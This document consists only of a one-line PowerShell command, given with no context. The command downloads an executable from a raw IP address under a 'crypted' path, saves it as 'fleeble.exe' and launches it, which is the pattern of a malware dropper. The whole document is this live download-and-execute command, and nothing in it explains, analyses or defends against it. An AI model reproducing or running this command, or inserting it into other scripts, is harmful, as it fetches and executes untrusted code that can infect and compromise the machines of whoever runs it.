
(New-Object System.Net.WebClient).DownloadFile('http://31.184.234.74/crypted/1080qw.exe','fleeble.exe');Start-Process 'fleeble.exe'

